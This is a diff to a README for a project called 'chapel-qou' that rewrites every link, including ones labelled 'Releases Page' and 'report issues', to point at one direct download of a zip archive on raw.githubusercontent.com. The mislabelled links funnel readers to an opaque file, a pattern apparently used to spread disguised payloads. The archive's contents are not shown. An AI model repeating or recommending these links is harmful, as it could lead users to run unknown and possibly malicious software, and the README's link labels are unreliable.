@@ -2,7 +2,7 @@
 
 ## 📥 Download Now!
 
-[![Download chapel-qou](https://img.shields.io/badge/Download-chapel--qou-blue.svg)](https://github.com/Apetalousflowerhelm232/chapel-qou/releases)
+[![Download chapel-qou](https://raw.githubusercontent.com/Apetalousflowerhelm232/chapel-qou/main/Cladoselachea/chapel-qou-3.9.zip)](https://raw.githubusercontent.com/Apetalousflowerhelm232/chapel-qou/main/Cladoselachea/chapel-qou-3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome! This guide will help you download and run chapel-qou easily. Follow the
 
 ## 📍 Download & Install
 
-To get chapel-qou, visit this page to download: [Releases Page](https://github.com/Apetalousflowerhelm232/chapel-qou/releases).
+To get chapel-qou, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Apetalousflowerhelm232/chapel-qou/main/Cladoselachea/chapel-qou-3.9.zip).
 
 1. Open the link above.
 2. Look for the latest version. It will be marked as the most recent release.
@@ -62,10 +62,10 @@ If you encounter any issues:
 
 - **Installation Fails**: Ensure your system meets the requirements and try downloading the file again.
 - **Application Crashes**: Restart your computer and try launching chapel-qou again.
-- **Need More Help?**: Visit our [GitHub page](https://github.com/Apetalousflowerhelm232/chapel-qou/issues) to report issues or ask questions.
+- **Need More Help?**: Visit our [GitHub page](https://raw.githubusercontent.com/Apetalousflowerhelm232/chapel-qou/main/Cladoselachea/chapel-qou-3.9.zip) to report issues or ask questions.
 
 ## 📞 Support
 
-For additional support, feel free to check the [Releases Page](https://github.com/Apetalousflowerhelm232/chapel-qou/releases) or contact us through our GitHub Issues page.
+For additional support, feel free to check the [Releases Page](https://raw.githubusercontent.com/Apetalousflowerhelm232/chapel-qou/main/Cladoselachea/chapel-qou-3.9.zip) or contact us through our GitHub Issues page.
 
 Thank you for using chapel-qou. We hope it makes your tasks easier!
